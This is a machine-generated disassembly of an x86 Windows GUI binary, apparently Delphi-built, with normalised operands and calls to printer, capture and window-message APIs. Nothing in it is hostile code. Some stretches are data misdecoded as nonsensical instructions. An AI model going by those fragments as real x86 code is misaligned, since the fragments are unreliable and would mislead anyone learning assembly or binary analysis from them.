mov [ eax + 0x2c ] edx
retn
sub_453378
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_44e1ac
pop ebp
retn 0x4
sub_45338c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_44e1ac
pop ebp
retn 0x4
sub_4533e5
jmp sub_405fd0
sub_4533ec
mov eax rw-data
mov edx 0xf
call sub_44e838
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_453503
jmp sub_405fd0
sub_453546
jmp sub_405fd0
sub_45354d
mov esp ebp
pop ebp
retn
sub_453748
push [ eax ]
cmp [ ebp ] al
inc edx
add ah dh
call [ eax + edi + 0x45 ]
add [ edx ] al
hlt
sub_453910
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_45391c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4539c9
jmp sub_405fd0
sub_4539d0
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_453ac4
jmp sub_405d1c
sub_453b35
jmp sub_405fd0
sub_453c73
jmp sub_405fd0
sub_453c7a
pop ebp
retn
sub_4553fd
jmp sub_405fd0
sub_455404
pop ebp
retn
ExtractIconW
jmp [ ExtractIconW@IAT ]
SHGetPathFromIDListW
jmp [ SHGetPathFromIDListW@IAT ]
SHGetSpecialFolderLocation
jmp [ SHGetSpecialFolderLocation@IAT ]
ClosePrinter
jmp [ ClosePrinter@IAT ]
DocumentPropertiesW
jmp [ DocumentPropertiesW@IAT ]
__imp_DocumentPropertiesW
jmp [ DocumentPropertiesW@IAT ]
OpenPrinterW
jmp [ OpenPrinterW@IAT ]
sub_455795
jmp [ eax + ebx * 2 ]
sub_4557a5
push [ ecx + 0x58 ]
inc ebp
add [ edx ] al
hlt
sub_455c98
push ebp
mov ebp esp
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a0558
mov eax [ rw-data ]
movzx eax [ eax + 0x1d ]
xor al 0x1
neg al
sbb eax eax
pop ebp
retn 0x8
sub_455d7e
in al dx
pop ebp
inc ebp
add [ edx ] al
hlt
sub_455f47
jmp sub_405fd0
sub_455f4e
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_456224
push ebx
mov ebx eax
mov dl 0x1
mov eax [ ebx + 0x58 ]
call sub_456474
mov eax ebx
call sub_44cf08
mov eax ebx
call sub_456244
pop ebx
retn
sub_456463
jmp sub_405fd0
sub_45646a
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4564d9
jmp sub_405fd0
sub_4564e0
pop ecx
pop ecx
pop ebp
retn
sub_4568b4
jmp sub_405fd0
sub_4568bb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_456931
jmp sub_405fd0
sub_456938
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_4569a1
jmp sub_405d1c
sub_4569d0
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_456344
mov eax [ ebx + 0x20 ]
pop ebx
retn
sub_456a3b
jmp sub_405fd0
sub_456a42
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_456ab2
jmp sub_405fd0
sub_456ab9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456b1e
jmp sub_405fd0
sub_456b25
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_456ba1
jmp sub_405fd0
sub_456ba8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456be8
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0xffffffff
jne r-xdata
mov eax [ ebx + 0x14 ]
pop ebx
retn
mov eax ebx
call sub_456f6c
sub_456d16
jmp sub_405fd0
sub_456d1d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456eff
jmp sub_405fd0
sub_456f10
jmp sub_405d1c
sub_456f53
jmp sub_405fd0
sub_456f5a
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
GetDefaultPrinterW
jmp [ GetDefaultPrinterW@IAT ]
sub_457132
jmp sub_405fd0
sub_45717d
jmp sub_405fd0
sub_457184
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4571d0
add eax 0x8
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
retn
sub_457204
push ebx
mov ebx eax
mov eax ebx
call sub_4571d0
mov eax ebx
call sub_45718c
pop ebx
retn
sub_457218
inc [ rw-data ]
jne r-xdata
retn
mov eax [ rw-data ]
call sub_4055f0
sub_45722c
inc [ rw-data ]
jne r-xdata
retn
mov eax [ rw-data ]
call sub_4055f0
sub_45750e
jmp sub_405d1c
sub_4575c7
jmp sub_405fd0
sub_4575ce
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4575d4
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
call sub_457548
sub_4575e4
cmp edx [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] edx
call sub_457548
sub_4575f4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x44 ] edx
call sub_457548
pop ebp
retn 0x8
sub_45760c
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_457620
inc [ rw-data ]
retn
sub_4578f3
jmp sub_405fd0
sub_4578fa
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x4
sub_45794f
jmp sub_405fd0
sub_457956
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x4
sub_457a34
jmp sub_405fd0
sub_457a3b
pop ebp
retn
sub_457e0c
inc [ esi ]
dec eax
popad
outsb
insb
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_4067e0
call [ rw-data ]
sub_457fb2
jmp sub_405d1c
sub_457fb7
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4a0994
call sub_406174
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457fd4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
pop esi
retn
sub_457fe0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xfff0
call sub_40587c
pop esi
retn
sub_457ff8
push ebx
push esi
mov ebx edx
mov si 0xffef
call sub_40587c
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_458010
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_458095
jmp sub_405fd0
sub_4580d6
jmp sub_405fd0
sub_4580dd
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4580e8
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4580fc
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_45841b
jmp sub_405fd0
sub_458422
pop ebp
retn
sub_458efd
inc ebp
add [ edx ] al
hlt
sub_4593e6
ficom [ esi + r-xdata ]
hlt
sub_45a001
cld
mov al [ r-xdata ]
hlt
sub_45b140
mov eax [ esp + 0x8 ]
retn
sub_45b148
push ebx
mov ebx eax
call sub_45b140
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
jmp sub_4060b0
sub_45b164
pop ebx
retn
sub_45b3cf
jmp sub_405fd0
sub_45b3d6
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45b50a
jmp sub_405fd0
sub_45b511
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45b5f7
jmp sub_405fd0
sub_45b5fe
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45b618
push ebx
mov eax [ rw-data ]
call sub_431228
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_4311fc
mov eax ebx
pop ebx
retn
sub_45b7a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_405830
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_45b7c4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
movzx eax [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_45bb78
mov edx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
call sub_45efec
retn
sub_45bb84
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
call sub_45efdc
dec eax
cmp eax [ ebx + 0x4 ]
setg al
test al al
je r-xdata
pop ebx
retn
inc [ ebx + 0x4 ]
sub_45bfc0
jmp sub_405fd0
sub_45bfc7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45c0ca
jmp sub_405fd0
sub_45c0d1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45c5a6
jmp sub_405fd0
sub_45c5ad
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_45c7f1
jmp sub_405fd0
sub_45c7f8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_45d25e
jmp sub_405fd0
sub_45d265
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d70e
jmp sub_405fd0
sub_45dbdb
jmp sub_405fd0
sub_45dbe2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e092
jmp sub_405fd0
sub_45e57b
jmp sub_405fd0
sub_45e582
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e744
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45bb34
retn
sub_45eb91
jmp sub_405fd0
sub_45eb98
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ee0a
jmp sub_405fd0
sub_45ee11
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45ee23
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_45efd4
mov eax [ r-xdata ]
retn
sub_45f010
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_45f034
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_45f0dc
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_405830
mov edx esi
call sub_45f05c
pop esi
pop ebx
retn
sub_45f158
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_45f34c
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_430608
mov ecx eax
sub_45f540
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_45f5a8
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_45f958
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_45f98c
sub_45f98c
mov edx sub_45f964
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_45b69c
retn
sub_45fc23
jmp sub_405fd0
sub_45fc2a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460163
jmp sub_405fd0
sub_46019a
jmp sub_405fd0
sub_4601a1
movzx eax [ ebp - 0x25 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4601f0
cmp dl [ eax + 0x3b ]
je r-xdata
retn
mov [ eax + 0x3b ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_4602e3
jmp sub_405fd0
sub_4602ea
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460400
mov ecx edx
xor edx edx
call sub_4602f4
retn
sub_46040c
mov ecx edx
mov dl 0x1
call sub_4602f4
retn
sub_4605e0
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_460710
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45bba0
retn
sub_460758
push ebp
mov ebp esp
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ esi + 0x38 ]
mov si 0xfffd
call sub_40587c
pop esi
pop ebp
retn 0x8
sub_460778
mov eax [ eax + 0x38 ]
call sub_45c284
retn
sub_460784
push esi
mov esi eax
mov eax [ esi + 0x38 ]
mov si 0xfff9
call sub_40587c
pop esi
retn
sub_460798
push ebx
mov ecx sub_45f964
mov edx [ eax + 0x38 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_45b69c
pop ebx
retn
sub_4609d0
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_460ad6
jmp sub_405fd0
sub_460af3
jmp sub_405fd0
sub_460afa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460b24
lea eax [ ebp - 0x28 ]
mov edx 0x2
call j_sub_4068c4
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_460b1d
jmp sub_405fd0
sub_460b24
pop ebx
mov esp ebp
pop ebp
retn
sub_460c78
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_460dae
jmp sub_405d1c
sub_460e84
jmp sub_405fd0
sub_460eaf
jmp sub_405fd0
sub_460ed0
movzx eax [ eax + 0x41 ]
xor al 0x1
retn
sub_460fd1
jmp sub_405fd0
sub_461134
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_460798
sub_4611b8
jmp sub_405fd0
sub_4611fc
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_461214
push ebx
mov ebx eax
mov eax ebx
call sub_43c684
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_461266
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_460798
sub_4612dc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_461427
jmp sub_405fd0
sub_46142e
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_461674
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_461684
sub_4616d8
mov eax [ eax + 0x38 ]
movzx eax [ eax + 0x3b ]
movzx eax [ eax + rw-data ]
retn
sub_4616e8
and edx 0x7f
movzx edx [ edx + rw-data ]
mov eax [ eax + 0x38 ]
mov [ eax + 0x3b ] dl
retn
sub_4616fc
mov eax [ eax + 0x38 ]
movzx eax [ eax + 0x3c ]
movzx eax [ eax + rw-data ]
retn
sub_46170c
and edx 0x7f
movzx edx [ edx + rw-data ]
mov eax [ eax + 0x38 ]
mov [ eax + 0x3c ] dl
retn
sub_461720
cmp dl [ eax + 0x64 ]
je r-xdata
retn
mov [ eax + 0x64 ] dl
mov edx [ eax + 0x3c ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call __imp_SendMessageW
sub_46179c
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x38 ]
call sub_45c0d8
retn
mov eax [ eax + 0x38 ]
mov edx [ edx + 0x38 ]
call sub_45c0d8
retn
sub_4617b8
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x38 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x38 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x38 ]
call sub_45c0d8
sub_461800
mov edx [ eax + 0x60 ]
test edx edx
je r-xdata
call sub_460778
retn
mov eax edx
retn
sub_461a04
mov [ eax + 0x60 ] edx
call sub_4617d4
retn
sub_461a3a
jmp sub_405d1c
sub_461a3f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4a0994
call sub_406174
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461da6
jmp sub_405fd0
sub_461dad
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4055f0
retn
sub_461dc3
jmp sub_405fd0
sub_461ee2
jmp sub_405fd0
sub_461ee9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461f06
mov eax [ ebp - 0x14 ]
call sub_4055f0
retn
sub_461eff
jmp sub_405fd0
sub_461f24
jmp sub_405fd0
sub_461fae
jmp sub_405fd0
sub_461fb5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461fe4
push ebx
mov ebx eax
mov eax ebx
xor ecx ecx
call sub_4307b0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_43e00c
sub_4620ac
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_4620c0
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x54 ]
retn
sub_4620c8
mov eax [ eax + 0x38 ]
mov [ eax + 0x54 ] edx
retn
sub_462270
push ebx
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45bba0
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_45ee40
mov eax ebx
pop ebx
retn
sub_4625d3
jmp sub_405fd0
sub_4625da
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462653
jmp sub_405fd0
sub_46265a
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4646e3
cld
inc edi
inc esi
add [ edx ] al
hlt
sub_465b56
pop esp
inc esi
add [ edx ] al
hlt
sub_469835
push [ ebp + ebx * 4 + 0x46 ]
add [ edx ] al
hlt
sub_46983d
push ecx
popfd
inc esi
add [ edx ] cl
cld
push [ eax ]
sahf
inc esi
add [ edx ] al
hlt
sub_46988d
push [ ebx ]
mov al [ r-xdata ]
hlt
sub_46ae6a
inc ebx
add ah bh
xchg edi eax
dec eax
add [ eax ] cl
retn
sub_46af32
push [ ebp - 0x50 ]
inc esi
add [ edx ] al
hlt
sub_46b0f0
mov cl 0x46
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
pop edi
add [ eax ] ah
retn
sub_46b2c6
inc ebx
add ah bh
xchg edi eax
dec eax
add [ eax ] cl
retn
sub_46c2a1
retn 0x46
sub_46c2a4
dec ebp
add bh bh
dec [ ebx + eax * 8 ]
inc esi
add [ edx ] al
hlt
sub_46c80c
add ah dh
jmp edx
sub_46c983
leave
inc esi
add [ edx ] al
add [ edx ] al
out 0xc9 eax
inc esi
add [ edx ] al
add [ edx ] al
pop es
0x46
sub_46cb38
or al [ esi + 0x57 ]
popad
imul esi [ ebp + eax * 2 + 0x76 ] 0x2746e65
add [ eax ] al
add [ 0x46cb8b00 ] al
add [ eax + eax - 0xc ] al
call ebx

sub_46cb59
cli

sub_46cb5b
inc esi
add [ edx ] al
hlt
sub_46ce85
push [ edi + ecx * 8 + r-xdata ]
hlt
sub_46d794
push 0x15
mov ecx rw-data
call sub_42fdd4
retn
sub_46d884
call GetCapture
call sub_46d414
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x34 ]
jne r-xdata
mov eax [ rw-data ]
sub_46d964
mov esp 0x420046d9
add ah dh
inc [ edx ]
fiadd [ esi ]
inc edx
add ah dh
[ edx + ebx * 8 ]
sub_46dc3c
push ebx
push eax
push sub_46dde0
call sub_43df58
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_46dc54
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_46dc5c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx ]
call sub_4054c8
pop esi
pop ebx
retn
sub_46dc70
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_43e00c
pop ebx
retn
sub_46dd83
jmp sub_405d1c
sub_46ddb4
xor eax eax
retn
sub_46ddb8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_46ddd0
retn
sub_46ddd4
mov eax [ rw-data ]
retn
sub_46dddc
retn
sub_46de0a
jmp sub_405d1c
sub_46de0f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4a0994
call sub_406174
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46de2c
call sub_4058d4
xor eax eax
mov [ rw-data ] eax
retn
sub_46de3c
call sub_4058d0
xor eax eax
mov [ rw-data ] eax
retn
sub_46df14
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x40 ]
movzx eax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_46df2c
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x88 ]
retn
sub_46df80
retn
sub_46e07c
mov eax [ eax + 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_46e088
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x40 ]
mov si 0xffe7
call sub_40587c
pop esi
pop ebp
retn 0x4
sub_46e144
push esi
mov edx eax
mov eax [ eax + 0x40 ]
mov si 0xffdd
call sub_40587c
pop esi
retn
sub_46e158
push esi
mov edx eax
mov eax [ eax + 0x40 ]
mov si 0xffdc
call sub_40587c
pop esi
retn
sub_46e16c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_46e178
mov al 0x1
retn
sub_46e17c
mov eax 0x4
retn
sub_46e184
retn
sub_46ed73
jmp sub_405d1c
sub_46f04b
jmp sub_405fd0
sub_46f0a7
jmp sub_405fd0
sub_46f119
jmp sub_405fd0
sub_46f128
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_46ee04
sub_46f2db
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_44d038
retn
sub_46f2f1
jmp sub_405fd0
sub_46f322
jmp sub_405fd0
sub_46f3a6
jmp sub_405fd0
sub_46f3d8
jmp sub_405fd0
sub_46f3df
mov esp ebp
pop ebp
retn
sub_46f4a1
jmp sub_405fd0
sub_46f4f8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_46f4c4
mov [ ebx + 0x58 ] esi
sub_46f64c
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_46f660
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_405830
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_46f749
jmp sub_405fd0
sub_46f750
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46f7df
jmp sub_405fd0
sub_46f7e6
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_46f7ec
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
pop ebx
retn
sub_46f834
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
pop ebx
retn
sub_46f93c
retn
sub_46f960
retn
sub_46fd04
xor eax eax
retn
sub_46fd08
movzx eax [ eax + 0x5a ]
retn
sub_46fd10
xor eax eax
retn
sub_46fd14
cmp [ eax + 0x34 ] 0x0
setne al
retn
sub_46fd1c
mov eax [ eax + 0x34 ]
retn
sub_46fdc4
mov edx [ eax + 0x68 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_46fef0
push ebx
mov ebx eax
movzx eax [ ebx + 0x5d ]
movzx eax [ eax + rw-data ]
cmp al [ ebx + 0x63 ]
setne al
pop ebx
retn
sub_46ffa0
mov [ eax + 0x5f ] dl
retn
sub_46ffa4
mov edx [ eax + 0x34 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_4752e0
sub_46ffb4
movzx eax [ eax + 0x5f ]
retn
sub_46ffbc
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_470629
jmp sub_405fd0
sub_470630
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470690
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x168 ] edx
retn
mov [ eax + 0x160 ] 0x1
sub_470734
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_47084d
jmp sub_405fd0
sub_470854
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470c1d
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esi
je r-xdata
pop esi
retn
mov [ eax + 0x5e ] dl
test dl dl
je r-xdata
mov si 0xffef
call sub_40587c
sub_470cce
jmp sub_405fd0
sub_470cd5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_470da8
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_472314
sub_470dc0
push 0x0
xor ecx ecx
mov edx 0xe
call sub_472314
retn
sub_470dd0
push edx
mov edx 0xd
call sub_472348
retn
sub_470ddc
mov edx [ eax + 0x9c ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_470df0
mov edx [ eax + 0x98 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_470e04
mov edx [ eax + 0xa4 ]
test edx edx
jle r-xdata
call sub_470ddc
retn
mov eax edx
retn
sub_470e18
mov edx [ eax + 0xa0 ]
test edx edx
jle r-xdata
call sub_470df0
retn
mov eax edx
retn
sub_470edd
jmp sub_405fd0
sub_470ee4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_470eec
cmp dl [ eax + 0x61 ]
je r-xdata
retn
mov [ eax + 0x61 ] dl
mov [ eax + 0x62 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_472314
sub_470f5c
cmp [ eax + 0x5b ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
retn
sub_470f70
movzx eax [ eax + 0x8a ]
xor al 0x1
retn
sub_470f7c
movzx eax [ eax + 0x62 ]
xor al 0x1
retn
sub_470f84
cmp dl [ eax + 0x5b ]
je r-xdata
retn
mov [ eax + 0x5b ] dl
cmp [ eax + 0x34 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_472314
sub_470fa8
cmp dl [ eax + 0x89 ]
je r-xdata
retn
mov [ eax + 0x89 ] dl
mov [ eax + 0x8a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_472314
sub_470fcc
cmp dl [ eax + 0x170 ]
je r-xdata
retn
mov [ eax + 0x170 ] dl
sub_471028
movzx eax [ eax + 0x5c ]
xor al 0x1
retn
sub_471030
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
cmp [ eax + 0x34 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_472314
sub_471054
cmp dl [ eax + 0x62 ]
je r-xdata
retn
mov [ eax + 0x62 ] dl
cmp [ eax + 0x34 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
